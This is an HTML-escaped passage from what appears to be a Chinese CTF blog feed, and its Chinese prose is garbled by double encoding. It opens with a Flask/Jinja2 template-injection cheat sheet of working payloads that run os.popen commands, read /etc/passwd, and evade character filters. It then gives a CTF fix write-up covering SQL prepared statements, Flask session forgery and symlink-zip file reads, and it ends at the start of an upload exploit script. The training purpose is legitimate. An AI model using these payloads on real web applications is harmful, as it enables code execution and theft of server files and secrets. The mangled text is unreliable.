style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>pop()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#ae81ff">.0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">linecache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-1">è¿‡æ»¤&lt;code>.&lt;/code>&lt;/h3>
&lt;p>&lt;code>.&lt;/code>ç‚¹å·ç”¨åœ¨å‘ä¸‹ä¸åœåœ°å–å€¼ï¼Œè·Ÿ&lt;code>[]&lt;/code>å¾ˆåƒ&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__class__&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>attr()&lt;/code> å¾ˆå¼ºçš„ä¸€ä¸ªflaskå†…ç½®filterï¼Œ&lt;code>foo|attr(&amp;quot;bar&amp;quot;) == foo.bar&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__base__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">............&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-2">è¿‡æ»¤&lt;code>'&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>chr&lt;/code> å…ˆæ‰¾å‡º&lt;code>chr()&lt;/code>çš„ä½ç½®ï¼ˆæ³¨æ„è·‘è„šæœ¬è·‘çš„æ˜¯&lt;code>__builtins__&lt;/code> è¿™ä¸ªå‡½æ•°æ˜¯å†…å»ºçš„ï¼‰ï¼Œç”¨æ¨¡æ¿è¯­å¥ç»™å®ƒèµ‹ä¸ªå€¼ï¼Œç„¶åè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code> flaskä¸­å­˜å‚¨è¯·æ±‚å‚æ•°åŠå€¼çš„å­—å…¸ï¼Œå¯ä»¥å°†å€¼å…ˆèµ‹ç»™å®ƒç„¶åè¿›è¡Œè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>arg1=os
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤_">è¿‡æ»¤&lt;code>_&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{&amp;#39;&amp;#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&amp;#39;/etc/passwd&amp;#39;).read() }}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>class=__class__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>base=__base__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>subclasses=__subclasses__
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ç§æ–¹å¼å¯ä»¥ç»“åˆgetå’Œpostï¼Œä¸¾ä¾‹-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr">[CTFshow å‡»å‰‘æ¯]é€šå…³å¤§ä½¬&lt;/a>ï¼Œåœ¨ä¸åŒçš„å­—æ®µå¤„å¯¹ä¼ å…¥å‚æ•°çš„é™åˆ¶æ˜¯ä¸åŒçš„&lt;/p>
&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021å¹´11æœˆ11æ—¥
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>æŒ‰å­—ç¬¦ä¸²çš„æ–¹å¼èµ°ï¼Œä¹Ÿå¯&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-3">è¿‡æ»¤&lt;code>{&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{}}&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-">è¿‡æ»¤&lt;code> &lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;code>+&lt;/code>æ›¿ä»£&lt;/li>
&lt;/ul>
&lt;h2 id="å…¶å®ƒå§¿åŠ¿">å…¶å®ƒå§¿åŠ¿&lt;/h2>
&lt;h3 id="çŸ­çŸ­çŸ­">çŸ­çŸ­çŸ­&lt;/h3>
&lt;p>åˆ©ç”¨çš„æ˜¯Flaskä¸­çš„&lt;code>config&lt;/code>å¯¹è±¡ï¼Œå®ƒå¯ä»¥å­˜å‚¨ä¸€éƒ¨åˆ†è®¾ç½®é¡¹çš„å†…å®¹ï¼›&lt;code>config.update&lt;/code>æ–¹æ³•å¯ä»¥ç”¨æ¥å­˜å‚¨è®¾ç½®é¡¹ä¸­çš„å˜é‡ï¼Œç”¨æ³•æ˜¯&lt;code>config.update(key=value)&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œç”¨ä¸€ä¸ªé¢˜åšä¾‹å­ï¼ŒæŒ‡è·¯-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[Digital Overdose 2021 Autumn CTF madlib]&lt;/a>&lt;/p>
&lt;h3 id="pwn---åŠ«æŒgotè¡¨getshell">***pwn - åŠ«æŒgotè¡¨getshell&lt;/h3>
&lt;p>pwnï¼Œåœ¨å­¦äº†åœ¨å­¦äº†ï¼ŒæŒ‡æ–°å»ºæ–‡ä»¶å¤¹å’Œmdæ–‡æ¡£ğŸ˜…&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">Python æ²™ç®±é€ƒé€¸&lt;/a>&lt;/p>
&lt;h1 id="tornado">Tornado&lt;/h1>
&lt;p>Tornadoä¹Ÿæ˜¯ä¸€ç§æ¨¡æ¿ï¼Œå¯ä»¥æ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼å’Œä¼ é€’å˜é‡ï¼Œå½“å‚æ•°å¯æ§æ—¶å¯èƒ½é€ æˆxsså’Œrce&lt;/p>
&lt;h2 id="å†…ç½®å­—å…¸å¯¹è±¡">å†…ç½®å­—å…¸å¯¹è±¡&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>handler.settings&lt;/code> æŒ‡å‘çš„æ˜¯RequestHandler.application.settings&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{handler.settings}}
{{escape(handler.settings[&amp;#34;cookie&amp;#34;])}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h1 id="django">Django&lt;/h1>
&lt;p>Djangoæ˜¯ä¸€ä¸ªpythonçš„webæ¡†æ¶ï¼Œç›¸æ¯”flaskæ¯”è¾ƒåºå¤§ä¸€ç‚¹ç‚¹ï¼›pç‰›çš„è¿™ç¯‡æ–‡ç« -&amp;gt;&lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰&lt;/a>æŒ‡å‡ºäº†ä¸€ç§åˆ©ç”¨æ€è·¯ï¼Œé€šè¿‡Djangoé»˜è®¤çš„adminçš„modelæ¥è·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€webåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯&lt;/p>
&lt;hr>
&lt;p>ä¸¤å‘¨ä¹‹å‰åŸºæœ¬æ€»ç»“è¿‡äº†ï¼Œä½†æ˜¯å‰ä¸¤å¤©é‡åˆ°è¦æ„é€ çš„å…·ä½“åœºæ™¯è¿˜æ˜¯æ‰“ä¸ç©¿ï¼Œäºæ˜¯åˆæ‹äº†ä¸€éåˆ©ç”¨çš„æ€è·¯ï¼ŒæŠŠç¬”è®°æ•´ç†å‡ºæ¥äº†&lt;/p>
&lt;p>è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å­¦ä¸œè¥¿è¦æ‰å®ï¼Œæ›´æ‰å®ä¸€ç‚¹ï¼Œä¸ç„¶ä¼šå¾ˆè›‹ç–¼&lt;/p></description></item><item><title>buuojåŠ å›ºé¢˜ Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuojæ–°ä¸Šäº†åŠ å›ºé¢˜è¿™ä¸ªåˆ†ç±»ï¼Œä¹Ÿå°±æ˜¯çº¿ä¸‹awdpä¸­fixçš„éƒ¨åˆ†ï¼Œåªè¦å°†é¶æœºä¸­å­˜åœ¨çš„æ¼æ´ä¿®å¤å¥½å¹¶é€šè¿‡checkçš„æ£€æµ‹å³å¯æ‹¿åˆ°flagï¼›æœ‰ä¸€è¯´ä¸€ï¼Œæ¯”å•çº¯attackæ‹¿flagä¼šç®€å•å¾ˆå¤šï¼ˆé€‚åˆæˆ‘è¿™ç§æ²¸ç‰©web&lt;/p>
&lt;p>ä¸‹é¢çš„wpä¼šå…ˆè¯´çº¯ä¿®å¤è§’åº¦ï¼Œå†ä¸²ä¸€ä¸‹æ•´ä½“çš„çŸ¥è¯†ç‚¹ï¼›å› ä¸ºè‡ªå·±æ°´å¹³æœ‰é™ï¼Œæƒ³å°½å¯èƒ½è¯´çš„æ¸…æ¥šä¸€äº›å°±ä¼šæ¯”è¾ƒå•°å—¦ï¼Œè§è°…QAQ&lt;/p>
&lt;h2 id="ezsql">Ezsql&lt;/h2>
&lt;h3 id="fix">FIX&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png" alt="image-20211107083450780">&lt;/p>
&lt;p>200è¡Œï¼Œå¤ªå…¸äº†ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°å®Œå…¨æ²¡æœ‰æ£€æµ‹ï¼Œæ˜¯ä¸ªç­›å­ï¼›ç”¨é¢„å¤„ç†çš„æ–¹å¼ä¿®ï¼Œåˆå¯ä»¥åˆ†ä¸ºä¸¤ç§å½¢å¼&lt;/p>
&lt;h3 id="mysqlé¢„å¤„ç†">mysqlé¢„å¤„ç†&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png" alt="image-20211107083655664">&lt;/p>
&lt;p>å…¶ä¸­201è¡Œçš„&lt;code>ss&lt;/code>æŒ‡çš„æ˜¯ç»‘å®šSQLå‚æ•°çš„ç±»å‹ä¸ºstringï¼Œè¿™ä¸€é¡¹å¿…ä¸å¯å°‘è€Œä¸”å¿…é¡»ä¸åé¢çš„å‚æ•°ä¸€ä¸€å¯¹åº”&lt;/p>
&lt;h3 id="pdoé¢„å¤„ç†">PDOé¢„å¤„ç†&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png" alt="image-20211107084309239">&lt;/p>
&lt;p>PDOé¢„å¤„ç†å±äºæ˜¯é€šé˜²äº†ï¼Œèƒ½æœ‰æ•ˆåœ°åº”å¯¹sqliç‰¹åˆ«æ˜¯å †å æ³¨å…¥ï¼Œ208è¡Œçš„è®¾ç½®é¡¹æ„ä¸ºç¦ç”¨æ¨¡æ‹Ÿé¢„å¤„ç†&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›babypython">[CISCN2021 æ€»å†³èµ›]babypython&lt;/h2>
&lt;h3 id="fix-1">FIX&lt;/h3>
&lt;p>sshè¿ä¸Šåçœ‹ä¸‹ç›®å½•ç»“æ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png" alt="image-20211106212456961">&lt;/p>
&lt;p>æŸ¥çœ‹/app/y0u_found_it/y0u_found_it_main.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png" alt="image-20211106212556547">&lt;/p>
&lt;p>11è¡Œè¿™ä¸æ˜¯å…¸ä¸­å…¸äº†ï¼Ÿè¯»macåœ°å€å°±æ‰“é€šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠSECRET_KEYæ”¹ä¸ºä¸€ä¸ªåˆé•¿åˆä¹±çš„éšæœºå­—ç¬¦ä¸²å³å¯ï¼Œå¯ä»¥ä½¿ç”¨&lt;a href="uuid/guid%E7%94%9F%E6%88%90%E5%99%A8">uuid/guidç”Ÿæˆå™¨&lt;/a>æ¥ç”Ÿæˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png" alt="image-20211106210732859">&lt;/p>
&lt;blockquote>
&lt;p>â€”â€”â€”â€”ç¢ç¢å¿µï¼šè¿™é‡Œä¿®å¤çš„æ—¶å€™å¯èƒ½çœ‹è„¸ï¼Ÿæˆ‘åœ¨å‡ å¤©å‰è¯•çš„æ—¶å€™ç”¨çš„ä¸€æ¨¡ä¸€æ ·çš„æ–¹æ³•ï¼Œä½†æ˜¯æ€ä¹ˆéƒ½ä¸èƒ½è¿‡checkï¼Œä»Šå¤©è¯•äº†ä¸€æ¬¡å°±å¯ä»¥äº†ï¼Œä½†æ˜¯åœ¨å†™wpçš„æ—¶å€™å†å¤ç›˜å°±åˆä¸å¯ä»¥äº†â€¦â€¦emmm å¯èƒ½è¿˜æ˜¯å“ªé‡Œçš„ç»†èŠ‚å‡ºäº†é”™ä½†æ˜¯æˆ‘æ²¡æœ‰æ³¨æ„åˆ°ï¼Ÿç»™æˆ‘æ•´ä¸ä¼šäº†å±äºæ˜¯&lt;/p>
&lt;/blockquote>
&lt;h3 id="å…³äºæœ¬é¢˜">å…³äºæœ¬é¢˜&lt;/h3>
&lt;p>æ˜¯ä¸ªåŸé¢˜ï¼Œè¿˜æ˜¯ä¸ªæœ‰äº†åŒ…æµ†çš„åŸé¢˜ï¼Œå‚è§-&amp;gt;&lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BHCTF%202018%5DHideandseek">[HCTF 2018]Hideandseek&lt;/a>&lt;/strong> | &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb3">[SWPU2019]Web3&lt;/a>&lt;/strong>ï¼Œåšè¿‡çš„å°±çŸ¥é“è¿™ä»–å¦ˆçœŸçš„å°±ä¸€æ¨¡ä¸€æ ·hhhhhhhh&lt;/p>
&lt;p>è€ƒç‚¹åœ¨äºlinuxè½¯é“¾æ¥+uuid+flask-sessionä¼ªé€ ï¼Œåè€…è¿˜ç»å¸¸å•ç‹¬å‡ºé¢˜ï¼Œæ¯”å¦‚ &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 åä¸œå—èµ›åŒº]Web4&lt;/a>&lt;/strong>ï¼Œéƒ½å¿«çƒ¤çƒ‚äº†&lt;/p>
&lt;h3 id="è€ƒç‚¹ä¸€--uuidsecret_key">è€ƒç‚¹ä¸€ Â· uuid&amp;amp;SECRET_KEY&lt;/h3>
&lt;p>SECRET_KEYé€šè¿‡uuid+ä¼ªéšæœºæ•°çš„æ–¹å¼ç”Ÿæˆï¼Œè¿™ä¸ªè€ƒç‚¹å¯ä»¥å‚è€ƒ &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 åä¸œå—èµ›åŒº]Web4&lt;/a>&lt;/strong>ï¼Œå…¶ä¸­app.pyæ˜¯è¿™æ ·å†™çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png" alt="image-20211106212834438">&lt;/p>
&lt;p>&lt;code>uuid.getnode()&lt;/code>ä¼šä»¥48ä½äºŒè¿›åˆ¶é•¿åº¦çš„æ­£æ•´æ•°å½¢å¼è¿”å›macåœ°å€ï¼Œlinuxä¸‹macåœ°å€çš„ä½ç½®åœ¨&lt;code>/sys/class/net/eth0/address&lt;/code>ï¼Œè¯»å‡ºmacåœ°å€åæˆ‘ä»¬ä¹Ÿæ¥ç”Ÿæˆä¸€æ³¢ä¼ªéšæœºæ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png" alt="image-20210707204313712">&lt;/p>
&lt;p>ä¹‹åé€šè¿‡flask-session-cookie-managerä¸€æŠŠæ¢­å³å¯ä¼ªé€ sessionå€¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png" alt="image-20210707204240633">&lt;/p>
&lt;p>â€”â€”â€”â€”å¦å¤–ï¼Œé€šå¸¸è®¿é—®ä¸å­˜åœ¨ç›®å½•æ—¶SECRET_KEYä¼šå‡ºç°åœ¨è¯·æ±‚å¤´ä¸­&lt;/p>
&lt;h3 id="è€ƒç‚¹äºŒ--linuxè½¯é“¾æ¥æ–‡ä»¶è¯»å–zipå‹ç¼©åŒ…">è€ƒç‚¹äºŒ Â· linuxè½¯é“¾æ¥æ–‡ä»¶è¯»å–&amp;amp;zipå‹ç¼©åŒ…&lt;/h3>
&lt;p>ln -sæ˜¯linuxä¸­çš„è½¯é“¾æ¥å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œå¯¹åº”æ–‡ä»¶çš„ç»å¯¹è·¯å¾„çš„è½¯é“¾æ¥æ¥è¯»æ–‡ä»¶ï¼›å½“ä¸çŸ¥é“flaskå·¥ä½œç›®å½•å¯ä»¥ä½¿ç”¨&lt;code>/proc/self/cwd&lt;/code>æ¥æŒ‡å‘å½“å‰è¿›ç¨‹çš„ç›®å½•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…é€šè¿‡&lt;code>/proc/self/environ&lt;/code>æ–‡ä»¶é‡ŒåŒ…å«è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»ä¸­è·å–flaskçš„ç»å¯¹è·¯å¾„ï¼Œå†åˆ¶ä½œè½¯é“¾æ¥ï¼ˆå…³äº/procçš„æ›´å¤šä¿¡æ¯å¯ä»¥å‚è§-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/procç›®å½•çš„å¦™ç”¨&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCEåˆ©ç”¨æ€»ç»“&lt;/a>ï¼Œé¢˜-&amp;gt;&lt;a href="https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown">[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œå¯¹äºç›®å½•å†…æ–‡ä»¶çš„åˆ—ä¸¾ä¹Ÿæ˜¯æœ‰æ–¹æ³•çš„ï¼Œå‚è§-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Webé¢˜ extract0r Writeup&lt;/a>&lt;/p>
&lt;p>ç”šè‡³ä¹Ÿå¯ä»¥å†™å…¥shellï¼Œå‚è§-&amp;gt;&lt;a href="https://mp.weixin.qq.com/s/NvItuko9ZAUNTJaSzBpNKw">[æ·±è‚²æ¯ 2021]Zipzip&lt;/a>&lt;/p>
&lt;p>åˆ¶ä½œå¥½çš„è½¯é“¾æ¥é€šè¿‡zipæ‰“åŒ…&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ›´å¤šé¢˜ç›®ä¸­çš„åº”ç”¨å¯ä»¥å‚è§-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">è®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•&lt;/a>&lt;/p>
&lt;p>å…³äºè¿™ä¸ªæ¼æ´çš„å®é™…åº”ç”¨å¯ä»¥å‚è§-&amp;gt;&lt;a href="https://paper.seebug.org/104/">GitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´&lt;/a>&lt;/p>
&lt;h3 id="attack">*ATTACK&lt;/h3>
&lt;p>exp.py - 1 ç”Ÿæˆè½¯é“¾æ¥&amp;amp;zip&amp;amp;è‡ªåŠ¨ä¸Šä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">makezip&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ln -s &amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39; exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
